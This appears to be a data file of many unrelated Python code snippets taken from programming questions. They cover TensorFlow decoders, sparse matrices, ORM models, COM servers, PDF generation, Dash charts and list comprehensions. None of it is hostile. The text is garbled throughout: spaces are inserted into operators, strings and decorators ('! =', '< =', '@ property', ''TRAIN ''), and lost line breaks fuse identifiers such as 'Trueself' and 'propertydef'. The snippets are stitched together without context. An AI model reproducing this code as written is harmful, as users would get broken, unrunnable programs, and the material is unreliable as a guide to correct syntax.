tf.contrib.seq2seq.BasicDecoder ( decoder_cell , helper , encoder_state , output_layer=projection_layer ) outputs , _ , _ = tf.contrib.seq2seq.dynamic_decode ( decoder , maximum_iterations=tf.reduce_max ( target_lengths ) ) logits = outputs.rnn_output if mode is 'TRAIN ' or mode is 'EVAL ' : # then calculate loss crossent = tf.nn.sparse_softmax_cross_entropy_with_logits ( labels=target_out , logits=logits ) target_weights = tf.sequence_mask ( target_lengths , maxlen=tf.shape ( target_out ) [ 1 ] , dtype=logits.dtype ) self.loss = tf.reduce_sum ( ( crossent * target_weights ) ) / tf.cast ( true_batch_size , tf.float32 ) if mode is 'TRAIN ' : # then calculate/clip gradients , then optimize model params = tf.trainable_variables ( ) gradients = tf.gradients ( self.loss , params ) clipped_gradients , _ = tf.clip_by_global_norm ( gradients , hparams.max_gradient_norm ) optimizer = tf.train.AdamOptimizer ( hparams.l_rate ) self.update_step = optimizer.apply_gradients ( zip ( clipped_gradients , params ) ) if mode is 'EVAL ' or mode is 'INFER ' : # then allow access to input/output tensors to printout self.src = source self.tgt = target_out self.preds = tf.argmax ( logits , axis=2 ) # Designate a saver operation self.saver = tf.train.Saver ( tf.global_variables ( ) ) def train ( self , sess ) : return sess.run ( [ self.update_step , self.loss ] ) def eval ( self , sess ) : return sess.run ( [ self.loss , self.src , self.tgt , self.preds ] ) def infer ( self , sess ) : return sess.run ( [ self.src , self.tgt , self.preds ] ) # tgt should not exist ( temporary debugging only )"
"< 447957346x5027974 sparse matrix of type ' < type 'numpy.uint32 ' > ' with -1005678730 stored elements in Compressed Sparse Row format > indptr = np.array ( a , dtype=np.uint32 ) # a is a python array ( ' L ' ) contain row index informationindices = np.array ( b , dtype=np.uint32 ) # b is a python array ( ' L ' ) contain column index informationdata = np.ones ( ( len ( indices ) , ) , dtype=np.uint32 ) test = csr_matrix ( ( data , indices , indptr ) , shape= ( len ( indptr ) -1 , 5027974 ) , dtype=np.uint32 ) ValueError : setting an array element with a sequence"
class MyModel ( peewee.Model ) : a = peewee.IntegerField ( ) b = peewee.IntegerField ( ) @ property def diff ( self ) : return self.a - self.b objects = list ( MyModel.select ( ) .where ( MyModel.diff < 17 ) ) @ propertydef complicated_property ( self ) : if 17 < = self.a < = 173 : return a_complicated_math_function ( self.a + self.b ) return another_complicated_math_function ( self.a * self.b ** 2 ) @ propertydef seven ( self ) : return 7
"class EventViewSet ( viewsets.ModelViewSet ) : serializer_class = EventViewSet permission_classes = ( permissions.IsAuthenticatedOrReadOnly , ) pagination_class = pagination.LimitOffsetPagination filter_backends = ( filters.DjangoFilterBackend , filters.SearchFilter , ) filter_class = EventFilter search_fields = ( 'name ' , 'city ' , 'state ' ) def get_queryset ( self ) :"
"> > > from ctypes import CDLL , get_errno > > > libc = CDLL ( 'libc.so.6 ' ) > > > libc.reboot ( 0xfee1dead , 537993216 , 0x1234567 , 0 ) -1 > > > get_errno ( ) 0 > > > libc.reboot ( 0xfee1dead , 537993216 , 0x1234567 ) -1 > > > get_errno ( ) 0 > > > from ctypes import c_uint32 > > > libc.reboot ( c_uint32 ( 0xfee1dead ) , c_uint32 ( 672274793 ) , c_uint32 ( 0x1234567 ) , c_uint32 ( 0 ) ) -1 > > > get_errno ( ) 0 > > > libc.reboot ( c_uint32 ( 0xfee1dead ) , c_uint32 ( 672274793 ) , c_uint32 ( 0x1234567 ) ) -1 > > > get_errno ( ) 0 > > >"
"self._thread = threading.Timer ( interval=2 , function=self._sendRequestState , args= ( self._lockState , ) , daemon=True ) .start ( ) self._thread = threading.Timer ( interval=2 , function=self._sendRequestState , args= ( self._lockState , ) ) self._thread.daemon = Trueself._thread.start ( )"
"kwargs = { 'name ' : vm_ [ 'name ' ] , 'image ' : get_image ( conn , vm_ ) , 'size ' : get_size ( conn , vm_ ) , 'location ' : get_location ( conn , vm_ ) , } get_size = namespaced_function ( get_size , globals ( ) ) get_image = namespaced_function ( get_image , globals ( ) ) def namespaced_function ( function , global_dict , defaults=None , preserve_context=False ) : `` ' Redefine ( clone ) a function under a different globals ( ) namespace scope preserve_context : Allow keeping the context taken from orignal namespace , and extend it with globals ( ) taken from new targetted namespace. `` ' if defaults is None : defaults = function.__defaults__ if preserve_context : _global_dict = function.__globals__.copy ( ) _global_dict.update ( global_dict ) global_dict = _global_dict new_namespaced_function = types.FunctionType ( function.__code__ , global_dict , name=function.__name__ , argdefs=defaults , closure=function.__closure__ ) new_namespaced_function.__dict__.update ( function.__dict__ ) return new_namespaced_function"
"dwg = ezdxf.readfile ( `` example.dxf '' ) print `` EXTMAX `` , dwg.header [ ' $ EXTMAX ' ] print `` EXTMIN `` , dwg.header [ ' $ EXTMIN ' ] print `` LIMMAX `` , dwg.header [ ' $ LIMMAX ' ] print `` LIMMIN `` , dwg.header [ ' $ LIMMIN ' ]"
source venv/bin/activate -bash : venv/bin/activate : No such file or directory
user_id item_id rating Timestamp 15 1 539 5 83898406816 1 586 5 8389840685 1 355 5 8389844749 1 370 5 83898459612 1 466 5 83898467914 1 520 5 83898467919 1 594 5 8389846797 1 362 5 83898488520 1 616 5 83898494123 2 260 5 86824456229 2 733 3 86824456232 2 786 3 86824456236 2 1073 3 86824456233 2 802 2 86824460338 2 1356 3 86824460330 2 736 3 86824469831 2 780 3 86824469827 2 648 2 868244699
"test03 = np.array ( [ 2,2,10,4,4,4,5,6,7,2,6,5,5,7,7,1,1 ] ) set of 2 local minima = > array [ 0 ] : array [ 1 ] set of 3 local minima = > array [ 3 ] : array [ 5 ] local minima , i = 9set of 2 local minima = > array [ 11 ] : array [ 12 ] set of 2 local minima = > array [ 15 ] : array [ 16 ] def local_min ( a ) : candidate_min=0 for i in range ( len ( a ) ) : # Controlling the first left element if i==0 and len ( a ) > =1 : # If the first element is a singular local minima if a [ 0 ] < a [ 1 ] : print ( `` local minima , i = 0 '' ) # If the element is a candidate to be part of a set of local minima elif a [ 0 ] ==a [ 1 ] : candidate_min=1 # Controlling the last right element if i == ( len ( a ) -1 ) and len ( a ) > =1 : if candidate_min > 0 : if a [ len ( a ) -1 ] ==a [ len ( a ) -2 ] : print ( `` set of `` + str ( candidate_min+1 ) + `` local minima = > array [ `` +str ( i-candidate_min ) + '' ] : array [ `` +str ( i ) + '' ] '' ) if a [ len ( a ) -1 ] < a [ len ( a ) -2 ] : print ( `` local minima , i = `` + str ( len ( a ) -1 ) ) # Controlling the other values in the middle of the array if i > 0 and i < len ( a ) -1 and len ( a ) > 2 : # If a singular local minima if ( a [ i ] < a [ i-1 ] and a [ i ] < a [ i+1 ] ) : print ( `` local minima , i = `` + str ( i ) ) # print ( str ( a [ i-1 ] ) + '' > `` + str ( a [ i ] ) + `` < `` +str ( a [ i+1 ] ) ) # debug # If it was found a set of candidate local minima if candidate_min > 0 : # The candidate set IS a set of local minima if a [ i ] < a [ i+1 ] : print ( `` set of `` + str ( candidate_min+1 ) + `` local minima = > array [ `` +str ( i-candidate_min ) + '' ] : array [ `` +str ( i ) + '' ] '' ) candidate_min = 0 # The candidate set IS NOT a set of local minima elif a [ i ] > a [ i+1 ] : candidate_min = 0 # The set of local minima is growing elif a [ i ] == a [ i+1 ] : candidate_min = candidate_min + 1 # It never should arrive in the last else else : print ( `` Something strange happen '' ) return -1 # If there is a set of candidate local minima ( first value found ) if ( a [ i ] < a [ i-1 ] and a [ i ] ==a [ i+1 ] ) : candidate_min = candidate_min + 1 def local_min_scipy ( a ) : minima = argrelextrema ( a , np.less_equal ) [ 0 ] return minimadef local_max_scipy ( a ) : minima = argrelextrema ( a , np.greater_equal ) [ 0 ] return minima test03 = np.array ( [ 2,2,10,4,4,4,5,6,7,2,6,5,5,7,7,1,1 ] ) print ( local_max_scipy ( test03 ) ) [ 0 2 4 8 10 13 14 16 ]"
"> > > ( 5.0 ) .__gt__ ( 4.5 ) True > > > ( 5 ) .__gt__ ( 4 ) Traceback ( most recent call last ) : File `` < input > '' , line 1 , in < module > AttributeError : 'int ' object has no attribute '__gt__ ' > > > 5 > 4True > > > `` hat '' .__gt__ ( `` ace '' ) True"
"sc = `` This is a spark connection '' print ( sc ) jupyter notebook -- startup-script startup.py from startup import sc , sqlContext"
rfx @ digest : /usr/share/fonts/truetype/ttf-dejavu $ echo вдлжофыдвжвдлжофыдвж > > > print u'абв ' ц│ц┌ц≈ > > > sys.stdout.encoding'UTF-8 '
"non_zero_in_square = [ grid [ row ] [ col ] for row in range ( start_row , start_row+3 ) for col in range ( start_col , start_col+3 ) if grid [ row ] [ col ] is not 0 ]"
"setup ( ... classifiers = [ ... `` Programming Language : : Python : : 2.7 '' , `` Programming Language : : Python : : 3 '' , `` Programming Language : : Python : : 3.1 '' , `` Programming Language : : Python : : 3.2 '' , `` Programming Language : : Python : : 3.3 '' , `` Programming Language : : Python : : 3.4 '' , `` Programming Language : : Python : : 3.5 '' , `` Programming Language : : Python : : 3.6 '' , `` Programming Language : : Python '' , ... ] , ... ) Fetching package metadata ... ... ... Solving package specifications : ... . UnsatisfiableError : The following specifications were found to be in conflict : - dendropy - python 3.5* Use `` conda info < package > '' to see the dependencies for each package"
"def levenshteinDistance ( s1 , s2 ) : l_s1 = len ( s1 ) l_s2 = len ( s2 ) d = [ [ a for a in genM ( x , l_s2 + 1 ) ] for x in xrange ( l_s1 + 1 ) ] for i in xrange ( 1 , l_s1 + 1 ) : for j in xrange ( 1 , l_s2 + 1 ) : d [ i ] [ j ] = min ( d [ i - 1 ] [ j ] + 1 , d [ i ] [ j - 1 ] + 1 , d [ i - 1 ] [ j - 1 ] + decide_of_equality ( s1 [ i - 1 ] , s2 [ j - 1 ] ) ) return d [ l_s1 ] [ l_s2 ]"
ModelsViewsTemplates
timestamp2013-08-11 14:23:50 0.32192013-08-11 14:23:49 0.32222013-08-11 14:19:14 0.33052013-08-11 00:47:15 0.34002013-08-11 00:47:15.001 0.33102013-08-11 00:47:15.002 0.33102013-08-10 22:38:15.003 0.34002013-08-10 22:38:14 0.34032013-08-10 22:38:13 0.3410
a | b | names | -- - | -- - | -- -- | 1 | -1 | ' a ' | 2 | -2 | ' b ' | 3 | -3 | ' a ' | 4 | -4 | ' b ' | a | b | names | new_col | -- - | -- - | -- -- | -- -- -- | 1 | -1 | ' a ' | 1 | 2 | -2 | ' b ' | -2 | 3 | -3 | ' a ' | 3 | 4 | -4 | ' b ' | -4 |
"flow = flow_from_clientsecrets ( CLIENT_SECRETS_FILE , scope=YOUTUBE_UPLOAD_SCOPE , message=MISSING_CLIENT_SECRETS_MESSAGE ) storage = Storage ( OAUTH_CREDENTIALS ) credentials = storage.get ( ) if credentials is None or credentials.invalid : # manual / UI login credentials = run_flow ( flow , storage , args ) credentials = Credentials.from_service_account_file ( SERVICE_ACCOUNT_FILE , scopes=YOUTUBE_UPLOAD_SCOPES ) if credentials is None or credentials.expired : raise ValueError ( 'Invalid credentials ' ) return build ( YOUTUBE_API_SERVICE_NAME , YOUTUBE_API_VERSION , credentials=credentials ) ... status , response = insert_request.next_chunk ( ) # < HttpError 401 `` Unauthorized '' >"
"class User ( object ) : def __init__ ( self , arg1 , arg2 ) : raise Exceptionuser = User.__new__ ( User ) print user < project.models.User object at 0x9e2dfac >"
"def excepthook ( self , type_ , value , traceback ) : print `` \n '' print type_ print value print traceback print `` \n '' sys.excepthook = self.excepthook print 3 + str ( 2 ) < type 'exceptions.TypeError ' > unsupported operand type ( s ) for + < traceback object at 0x02BAE800 > Traceback ( most recent call last ) : File `` testcidnelite.py '' , line 13 , in < module > print 3 + str ( 2 ) TypeError : unsupported operand type ( s ) for + : 'int ' and 'str ' raise Error in sys.excepthook : Traceback ( most recent call last ) : File `` C : \psi-test-automation\Selenium\TestMethods2.py '' , line 145 , in excepthook raiseTypeError : exceptions must be old-style classes or derived from BaseException , not NoneType raise type_ Error in sys.excepthook : Traceback ( most recent call last ) : File `` C : \psi-test-automation\Selenium\TestMethods2.py '' , line 145 , in excepthook raise type_TypeErrorOriginal exception was : Traceback ( most recent call last ) : File `` testcidnelite.py '' , line 13 , in < module > print 3 + str ( 2 ) TypeError : unsupported operand type ( s ) for + : 'int ' and 'str '"
"from sklearn import gaussian_processprint `` x : '' , x__print `` y : '' , y__gp = gaussian_process.GaussianProcess ( theta0=1e-2 , thetaL=1e-4 , thetaU=1e-1 ) gp.fit ( x__ , y__ )"
"mutation { createTheme ( name : `` qwe '' ) { theme { id } } } from models import Theme as ThemeModel , Topic as TopicModel , Article as ArticleModel ... class CreateTheme ( graphene.Mutation ) : class Arguments : id = graphene.Int ( ) name = graphene.String ( ) theme = graphene.Field ( lambda : Theme ) def mutate ( self , name ) : theme = ThemeModel ( name = name ) theme.insert ( ) return CreateTheme ( theme = theme ) ... class Mutation ( graphene.ObjectType ) : create_theme = CreateTheme.Field ( ) ... schema = graphene.Schema ( query=Query , mutation = Mutation )"
exec `` print __name__ '' exec `` print __name__ '' in { }
"def dec ( func ) : @ wraps ( func ) def wrapper ( *a , **k ) return func ( ) return wrapper @ decdef f ( arg1 , arg2 , arg3=SOME_VALUE ) : returnimport inspectprint inspect.argspec ( f ) -- -- -- -- -- -ArgSpec ( args= [ ] , varargs= ' a ' , keywords= ' k ' , defaults=None )"
"; AutoIt v3 script to run a Stata do-file from an external text editor ; Version 3.1 , Friedrich Huebler , fhuebler @ gmail.com , www.huebler.info , 30 March 2009 ; Declare variablesGlobal $ ini , $ statapath , $ statawin , $ dofile , $ winpause , $ keypause , $ clippause ; File locations ; Path to INI file $ ini = @ ScriptDir & `` \rundo.ini '' ; Path to Stata executable $ statapath = IniRead ( $ ini , `` Stata '' , `` statapath '' , `` C : \Program Files\Stata10\wsestata.exe '' ) ; Title of Stata window $ statawin = IniRead ( $ ini , `` Stata '' , `` statawin '' , `` Stata/SE 10.1 '' ) ; Path to do-file that is passed to AutoIt ; Edit line to match editor used , if necessary $ dofile = $ CmdLine [ 1 ] ; Delays ; Pause after copying of Stata commands to clipboard $ clippause = IniRead ( $ ini , `` Delays '' , `` clippause '' , `` 100 '' ) ; Pause between window-related operations $ winpause = IniRead ( $ ini , `` Delays '' , `` winpause '' , `` 200 '' ) ; Pause between keystrokes sent to Stata $ keypause = IniRead ( $ ini , `` Delays '' , `` keypause '' , `` 1 '' ) ; Set SendKeyDelay and WinWaitDelay to speed up or slow down scriptOpt ( `` WinWaitDelay '' , $ winpause ) Opt ( `` SendKeyDelay '' , $ keypause ) ; If more than one Stata window is open , the window ; that was most recently active will be matchedOpt ( `` WinTitleMatchMode '' , 2 ) ; Check if Stata is already open , start Stata if notIf WinExists ( $ statawin ) Then WinActivate ( $ statawin ) WinWaitActive ( $ statawin ) ; Activate Stata Command Window and select text ( if any ) Send ( `` ^4 '' ) Send ( `` ^a '' ) ; Run saved do-file ; Double quotes around $ dofile needed in case path contains blanks ClipPut ( `` do `` & ' '' ' & $ dofile & ' '' ' ) ; Pause avoids problem with clipboard , may be AutoIt or Windows bug Sleep ( $ clippause ) Send ( `` ^v '' & `` { Enter } '' ) Else Run ( $ statapath ) WinWaitActive ( $ statawin ) ; Activate Stata Command Window Send ( `` ^4 '' ) ; Run saved do-file ; Double quotes around $ dofile needed in case path contains blanks ClipPut ( `` do `` & ' '' ' & $ dofile & ' '' ' ) ; Pause avoids problem with clipboard , may be AutoIt or Windows bug Sleep ( $ clippause ) Send ( `` ^v '' & `` { Enter } '' ) EndIf ; End of script `` STATA DO-FILE SCRIPTSfun ! RunIt ( ) w ! start `` C : \Programme\Stata10\integvim\rundo3\rundo.exe '' `` % : p '' endfunmap < F8 > : < C-U > call RunIt ( ) < CR > < CR > imap < F8 > < Esc > : < C-U > call RunIt ( ) < CR > < CR > fun ! RunDoLines ( ) let selectedLines = getbufline ( ' % ' , line ( `` ' < `` ) , line ( `` ' > '' ) ) if col ( `` ' > '' ) < strlen ( getline ( line ( `` ' > '' ) ) ) let selectedLines [ -1 ] = strpart ( selectedLines [ -1 ] , 0 , col ( `` ' > '' ) ) endif if col ( `` ' < `` ) ! = 1 let selectedLines [ 0 ] = strpart ( selectedLines [ 0 ] , col ( `` ' < `` ) -1 ) endif let temp = tempname ( ) . `` .do '' call writefile ( selectedLines , temp ) exec `` ! start C : \\Programme\\Stata10\\integvim\\rundo3\\rundo.exe `` . temp au VimLeave * exe `` ! del -y '' tempendfunmap < F9 > : < C-U > call RunDoLines ( ) < CR > < CR > imap < F9 > < Esc > : < C-U > call RunDoLines ( ) < CR > < CR >"
"// This file will be processed by the MIDL tool to// produce the type library ( imtg.tlb ) and marshalling code.import `` oaidl.idl '' ; import `` ocidl.idl '' ; [ object , uuid ( 4fafbb23-6a38-4613-b93b-68ea66c67043 ) , dual , helpstring ( `` IImtGroupApp Interface '' ) , pointer_default ( unique ) ] interface IImtGroupApp : IDispatch { [ id ( 1 ) , helpstring ( `` method EchoString '' ) ] HRESULT EchoString ( [ in ] BSTR in1 , [ out , retval ] BSTR *vals ) ; [ id ( 2 ) , helpstring ( `` method AddNumbers '' ) ] HRESULT AddNumbers ( [ in ] long in1 , [ in ] long in2 , [ out , retval ] long *vali ) ; } ; [ uuid ( d665e9d0-71a9-4e23-a1b4-abe3376d5c58 ) , version ( 1.0 ) , helpstring ( `` ImtGroup 1.0 Type Library '' ) ] library IMTGROUPLib { importlib ( `` stdole32.tlb '' ) ; importlib ( `` stdole2.tlb '' ) ; importlib ( `` msado15.dll '' ) ; [ uuid ( ced66424-93fb-4307-9062-7bee76d3d8eb ) , helpstring ( `` ImtGroupApp Class '' ) ] coclass ImtGroupApp { [ default ] interface IImtGroupApp ; } ; } ; import sys , osimport pythoncomimport win32comimport winerror # importers check was old py2exe current uses frozenif hasattr ( sys , 'frozen ' ) : # we are running as py2exe-packed executable print `` is an exe '' pythoncom.frozen = 1else : print `` not an exe '' class CImtg : _reg_clsctx_ = pythoncom.CLSCTX_LOCAL_SERVER # # COM declarations # _reg_clsid_ = `` { 24c0e3fe-58e7-4485-87dc-9f9e823b85e1 } '' _reg_desc_ = `` IMTGroup Python test object '' _reg_progid_ = `` ImtGroup.Test '' if hasattr ( sys , 'frozen ' ) : # In the py2exe-packed version , specify the module.class # to use . In the python script version , python is able # to figure it out itself . _reg_class_spec_ = `` __main__.CImtg '' print `` set reg_class_spec '' print _reg_class_spec_ # # # # # # Link to typelib - uuid matches uuid for type library in idl file _typelib_guid_ = ' { d665e9d0-71a9-4e23-a1b4-abe3376d5c58 } ' _typelib_version_ = 1 , 0 _com_interfaces_ = [ 'IImtGroupApp ' ] def __init__ ( self ) : # # # initialize something here if necessary # # # The item below is not used in this example self.MyProp1 = 10 def EchoString ( self , in1 ) : return `` Echoing `` + in1 def AddNumbers ( self , in1 , in2 ) : return in1 + in2def BuildTypelib ( ) : from distutils.dep_util import newer this_dir = os.path.dirname ( __file__ ) idl = os.path.abspath ( os.path.join ( this_dir , `` imtg.idl '' ) ) tlb=os.path.splitext ( idl ) [ 0 ] + '.tlb ' if os.path.isfile ( idl ) : # test for idl - if no idl do n't create tlb assume its there # Comment below for building exe as we will have type library if newer ( idl , tlb ) : print `` Compiling % s '' % ( idl , ) rc = os.system ( 'midl `` % s '' ' % ( idl , ) ) if rc : raise RuntimeError ( `` Compiling MIDL failed ! '' ) # Ca n't work out how to prevent MIDL from generating the stubs . # just nuke them for fname in `` dlldata.c imtg_i.c imtg_p.c imtg.h '' .split ( ) : os.remove ( os.path.join ( this_dir , fname ) ) print `` Registering % s '' % ( tlb , ) tli=pythoncom.LoadTypeLib ( tlb ) pythoncom.RegisterTypeLib ( tli , tlb ) def UnregisterTypelib ( ) : k = CImtg try : pythoncom.UnRegisterTypeLib ( k._typelib_guid_ , k._typelib_version_ [ 0 ] , k._typelib_version_ [ 1 ] , 0 , pythoncom.SYS_WIN32 ) print `` Unregistered typelib '' except pythoncom.error , details : if details [ 0 ] ==winerror.TYPE_E_REGISTRYACCESS : pass else : raiseif __name__=='__main__ ' : print `` checking frozen '' if hasattr ( sys , 'frozen ' ) : # running as packed executable if ' -- unregister ' in sys.argv or ' -- register ' in sys.argv : if ' -- unregister ' in sys.argv : # Unregister the type-libraries . UnregisterTypelib ( ) import win32com.server.register win32com.server.register.UseCommandLine ( CImtg ) else : # Build and register the type-libraries . BuildTypelib ( ) import win32com.server.register win32com.server.register.UseCommandLine ( CImtg ) else : import win32com.server from win32com.server import localserver print `` starting the server '' localserver.main ( ) else : if ' -- unregister ' in sys.argv : # Unregister the type-libraries . UnregisterTypelib ( ) import win32com.server.register win32com.server.register.UseCommandLine ( CImtg ) else : if ' -- register ' in sys.argv : # Build and register the type-libraries . BuildTypelib ( ) import win32com.server.register win32com.server.register.UseCommandLine ( CImtg ) # This setup script builds a single-file Python inprocess COM server. # import modulefinderimport win32com , sysfor p in win32com.__path__ [ 1 : ] : modulefinder.AddPackagePath ( `` win32com '' , p ) for extra in [ `` win32com.shell '' ] : __import__ ( extra ) m = sys.modules [ extra ] for p in m.__path__ [ 1 : ] : modulefinder.AddPackagePath ( extra , p ) from distutils.core import setupimport py2exeimport sys # If run without args , build executables , in quiet mode.if len ( sys.argv ) == 1 : sys.argv.append ( `` py2exe '' ) sys.argv.append ( `` -q '' ) class Target : def __init__ ( self , **kw ) : self.__dict__.update ( kw ) # for the versioninfo resources self.name = `` IMTG Server '' # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # pywin32 COM pulls in a lot of stuff which we do n't want or need.CImtg = Target ( description = `` Sample COM server '' , # what to build . For COM servers , the module name ( not the # filename ) must be specified ! modules = [ `` imtg_server '' ] , # we only want the inproc server . ) excludes = [ `` pywin '' , `` pywin.debugger '' , `` pywin.debugger.dbgcon '' , `` pywin.dialogs '' , `` pywin.dialogs.list '' ] options = { `` bundle_files '' : 1 , # create singlefile exe `` compressed '' : 1 , # compress the library archive `` excludes '' : excludes , `` dll_excludes '' : [ `` w9xpopen.exe '' ] # we do n't need this } setup ( options = { `` py2exe '' : options } , zipfile = None , # append zip-archive to the executable . com_server = [ CImtg ] ) dim MDset MD = CreateObject ( `` ImtGroup.Test '' ) dim responseresponse = MD.EchoString ( `` Really '' ) MsgBox ( response ) pythoncom error : ERROR : server.policy could not create an instance.Traceback ( most recent call last ) : File `` win32com\server\policy.pyc '' , line 136 , in CreateInstance File `` win32com\server\policy.pyc '' , line 194 , in _CreateInstance_ File `` win32com\server\policy.pyc '' , line 727 , in call_func File `` win32com\server\policy.pyc '' , line 717 , in resolve_funcAttributeError : 'module ' object has no attribute 'CImtg'pythoncom error : Unexpected gateway errorTraceback ( most recent call last ) : File `` win32com\server\policy.pyc '' , line 136 , in CreateInstance File `` win32com\server\policy.pyc '' , line 194 , in _CreateInstance_ File `` win32com\server\policy.pyc '' , line 727 , in call_func File `` win32com\server\policy.pyc '' , line 717 , in resolve_funcAttributeError : 'module ' object has no attribute 'CImtg'pythoncom error : CPyFactory : :CreateInstance failed to create instance . ( 80004005 ) _reg_class_spec_ = `` __main__.CImtg ''"
"Hauptstraße 213 Hauptstra\u00dfe 213 class NonAsciiJSONEncoder ( json.JSONEncoder ) : def __init__ ( self , **kwargs ) : super ( NonAsciiJSONEncoder , self ) .__init__ ( kwargs ) self.ensure_ascii = False app.json_encoder = NonAsciiJSONEncoder app.json_encoder.ensure_ascii = False"
"Name , Surname , dateOfBirth , city , country mostFreqComb= df.groupby ( [ 'Name ' , 'Surname ' ] ) [ 'Name ' ] .count ( ) .argmax ( )"
"import pandas as pdimport numpy as npimport dashimport dash_core_components as dccimport dash_html_components as htmlimport plotly.graph_objs as gofrom plotly.subplots import make_subplotsdf = pd.read_csv ( 'https : //raw.githubusercontent.com/plotly/datasets/master/finance-charts-apple.csv ' ) .iloc [ :60 ] fig = make_subplots ( rows=2 , cols=1 , row_heights= [ 0.8 , 0.2 ] , vertical_spacing=0 ) fig.add_trace ( go.Candlestick ( open=df [ 'AAPL.Open ' ] , high=df [ 'AAPL.High ' ] , low=df [ 'AAPL.Low ' ] , close=df [ 'AAPL.Close ' ] , increasing_line_color= ' # 0384fc ' , decreasing_line_color= ' # e8482c ' , name='AAPL ' ) , row=1 , col=1 ) fig.add_trace ( go.Scatter ( y=np.random.randint ( 20 , 40 , len ( df ) ) , marker_color= ' # fae823 ' , name='VO ' , hovertemplate= [ ] ) , row=2 , col=1 ) fig.update_layout ( { 'plot_bgcolor ' : `` # 21201f '' , 'paper_bgcolor ' : `` # 21201f '' , 'legend_orientation ' : `` h '' } , legend=dict ( y=1 , x=0 ) , font=dict ( color= ' # dedddc ' ) , dragmode='pan ' , hovermode= ' x unified ' , margin=dict ( b=20 , t=0 , l=0 , r=40 ) ) fig.update_xaxes ( showgrid=False , zeroline=False , rangeslider_visible=False , showticklabels=False , showspikes=True , spikemode='across ' , spikesnap='data ' , showline=False , spikedash='solid ' ) fig.update_yaxes ( showgrid=False , zeroline=False ) fig.update_traces ( xaxis= ' x ' , hoverinfo='none ' ) app = dash.Dash ( __name__ ) app.layout = html.Div ( children= [ html.Div ( dcc.Graph ( id='chart ' , figure=fig , config= { 'displayModeBar ' : False } ) ) ] ) if __name__ == '__main__ ' : app.run_server ( debug=True , dev_tools_ui=False , dev_tools_props_check=False )"
"import ctypes as ctclass Point ( ct.Structure ) : _fields_ = [ ( ' x ' , ct.c_int ) , ( ' y ' , ct.c_int ) , ] p1 = Point ( 10 , 10 ) p2 = Point ( 10 , 10 ) print p1 == p2 # = > False import ctypes as ctclass CtStruct ( ct.Structure ) : def __eq__ ( self , other ) : for field in self._fields_ : attr_name = field [ 0 ] a , b = getattr ( self , attr_name ) , getattr ( other , attr_name ) is_array = isinstance ( a , ct.Array ) if is_array and a [ : ] ! = b [ : ] or not is_array and a ! = b : return False return True def __ne__ ( self , other ) : for field in self._fields_ : attr_name = field [ 0 ] a , b = getattr ( self , attr_name ) , getattr ( other , attr_name ) is_array = isinstance ( a , ct.Array ) if is_array and a [ : ] ! = b [ : ] or not is_array and a ! = b : return True return Falseclass Point ( CtStruct ) : _fields_ = [ ( ' x ' , ct.c_int ) , ( ' y ' , ct.c_int ) , ( 'arr ' , ct.c_int * 2 ) , ] p1 = Point ( 10 , 20 , ( 30 , 40 ) ) p2 = Point ( 10 , 20 , ( 30 , 40 ) ) print p1 == p2 # True"
"class unique_server_endpoints ( argparse.Action ) : `` '' '' This class avoids having two duplicate OuterIPs in the client argument list '' '' '' def __call__ ( self , parser , namespace , values , option_string=None ) : ips = set ( ) endpoints = [ ] for r in values : ep = server_endpoint ( r ) if ep [ 0 ] in ips : raise argparse.ArgumentTypeError ( `` Duplicate OuterIPs found '' ) else : ips.add ( ep [ 0 ] ) endpoints.append ( ep ) setattr ( namespace , self.dest , endpoints ) group.add_argument ( '-c ' , `` -- client '' , nargs = 2 , dest = `` servers '' , action = unique_server_endpoints ,"
> df1key value10 1000010020 1000000030 1010000040 11110000 > df_reskey 0 1 2 3 4 5 6 710 1 0 0 0 0 1 0 020 1 0 0 0 0 0 0 030 1 0 1 0 0 0 0 040 1 1 1 1 0 0 0 0
"import StringIOfrom reportlab.pdfgen import canvasimport uuiddef test ( pdf_file_name= '' abc.pdf '' , pdf_size= ( 432 , 648 ) , font_details= ( `` Times-Roman '' , 9 ) ) : # create a new PDF with Reportla text_to_add = `` I am writing here.. '' new_pdf = `` test_ % s.pdf '' % ( str ( uuid.uuid4 ( ) ) ) packet = StringIO.StringIO ( ) packet.seek ( 0 ) c = canvas.Canvas ( pdf_file_name , pagesize = pdf_size ) # - Get the length of text in a PDF . text_len = c.stringWidth ( text_to_add , font_details [ 0 ] , font_details [ 1 ] ) # - take margin 20 and 20 in both axis # - Adjust starting point on x axis according to text_len x = pdf_size [ 0 ] -20 - text_len y = 20 # - set font . c.setFont ( font_details [ 0 ] , font_details [ 1 ] ) # - write text , c.drawString ( x , y , text_to_add ) c.showPage ( ) c.save ( ) return pdf_file_name from reportlab.lib.pagesizes import letterfrom reportlab.lib.styles import getSampleStyleSheetfrom reportlab.platypus import BaseDocTemplate , Frame , PageTemplate , Paragraphstyles = getSampleStyleSheet ( ) styleN = styles [ 'Normal ' ] styleH = styles [ 'Heading1 ' ] def footer ( canvas , doc ) : canvas.saveState ( ) P = Paragraph ( `` This is a multi-line footer . It goes on every page. `` * 10 , styleN ) w , h = P.wrap ( doc.width , doc.bottomMargin ) print `` w , h : '' , w , h print `` doc.leftMargin : '' , doc.leftMargin P.drawOn ( canvas , 10 , 30 ) canvas.restoreState ( ) def test ( ) : doc = BaseDocTemplate ( 'test.pdf ' , pagesize= ( 432 , 648 ) ) print `` doc.leftMargin : '' , doc.leftMargin print `` doc.bottomMargin : '' , doc.bottomMargin print `` doc.width : '' , doc.width print `` doc.height : '' , doc.height frame = Frame ( 10 , 50 , 432 , 648 , id='normal ' ) template = PageTemplate ( id='test ' , frames=frame , onPage=footer ) doc.addPageTemplates ( [ template ] ) text = [ ] for i in range ( 1 ) : text.append ( Paragraph ( `` '' , styleN ) ) doc.build ( text ) doc.leftMargin : 72.0doc.bottomMargin : 72.0doc.width : 288.0doc.height : 504.0 w , h : 288.0 96doc.leftMargin : 72.0"
"> > > a = [ 1 , 2 , 3 , 4 , 5 ] > > > [ i for i in a if i > 2 ] [ 3 , 4 , 5 ] > > > a = [ 1 , 2 , 3 , 4 , 5 ] > > > b = [ ] > > > [ b.append ( i ) for i in a ] [ None , None , None , None , None ] > > > print b [ 1 , 2 , 3 , 4 , 5 ] for i in a : b.append ( i )"
